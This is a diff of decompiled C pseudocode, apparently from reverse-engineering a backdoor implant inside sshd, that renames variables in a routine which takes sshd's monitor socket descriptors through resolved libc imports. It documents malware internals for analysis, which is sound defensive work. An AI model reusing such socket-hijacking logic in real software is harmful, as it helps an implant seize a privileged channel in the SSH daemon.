@@ -17,53 +17,51 @@ BOOL sshd_get_client_socket
                (global_context_t *ctx,int *pSocket,int socket_index,SocketMode socket_direction)
 
 {
-  monitor *addr;
-  BOOL BVar1;
-  ssize_t sVar2;
-  int *piVar3;
-  libc_imports_t *plVar4;
-  int fd;
+  monitor *monitor_candidate;
+  BOOL range_ok;
+  ssize_t read_result;
   int *errno_ptr;
-  monitor *monitor_ptr;
-  int client_fd;
+  libc_imports_t *imports;
+  int socket_fd;
+  u8 read_probe_buf[9];
   
   if (((ctx == (global_context_t *)0x0) ||
-      (plVar4 = ctx->libc_imports, plVar4 == (libc_imports_t *)0x0)) || (pSocket == (int *)0x0)) {
+      (imports = ctx->libc_imports, imports == (libc_imports_t *)0x0)) || (pSocket == (int *)0x0)) {
     return FALSE;
   }
   if (ctx->struct_monitor_ptr_address != (monitor **)0x0) {
-    addr = *ctx->struct_monitor_ptr_address;
-    BVar1 = is_range_mapped((u8 *)addr,4,ctx);
-    if (BVar1 != FALSE) {
+    monitor_candidate = *ctx->struct_monitor_ptr_address;
+    range_ok = is_range_mapped((u8 *)monitor_candidate,4,ctx);
+    if (range_ok != FALSE) {
       if (socket_direction == DIR_WRITE) {
-        fd = addr->m_recvfd;
+        socket_fd = monitor_candidate->m_recvfd;
       }
       else {
         if (socket_direction != DIR_READ) {
           return FALSE;
         }
-        fd = addr->m_sendfd;
+        socket_fd = monitor_candidate->m_sendfd;
       }
-      *(u8 *)&client_fd = 0;
-      plVar4 = ctx->libc_imports;
-      if (((-1 < fd) && (plVar4 != (libc_imports_t *)0x0)) &&
-         ((plVar4->read != (pfn_read_t)0x0 &&
-          (plVar4->__errno_location != (pfn___errno_location_t)0x0)))) {
+      read_probe_buf[0] = 0;
+      imports = ctx->libc_imports;
+      if (((-1 < socket_fd) && (imports != (libc_imports_t *)0x0)) &&
+         ((imports->read != (pfn_read_t)0x0 &&
+          (imports->__errno_location != (pfn___errno_location_t)0x0)))) {
         do {
-          sVar2 = (*plVar4->read)(fd,&client_fd,0);
-          piVar3 = (*plVar4->__errno_location)();
-          if (-1 < (int)sVar2) goto LAB_00107d34;
-        } while (*piVar3 == 4);
-        if (*piVar3 != 9) {
+          read_result = (*imports->read)(socket_fd,read_probe_buf,0);
+          errno_ptr = (*imports->__errno_location)();
+          if (-1 < (int)read_result) goto LAB_00107d34;
+        } while (*errno_ptr == 4);
+        if (*errno_ptr != 9) {
 LAB_00107d34:
-          *pSocket = fd;
+          *pSocket = socket_fd;
           return TRUE;
         }
       }
     }
-    plVar4 = ctx->libc_imports;
+    imports = ctx->libc_imports;
   }
-  BVar1 = sshd_get_usable_socket(pSocket,socket_index,plVar4);
-  return BVar1;
+  range_ok = sshd_get_usable_socket(pSocket,socket_index,imports);
+  return range_ok;
 }
 
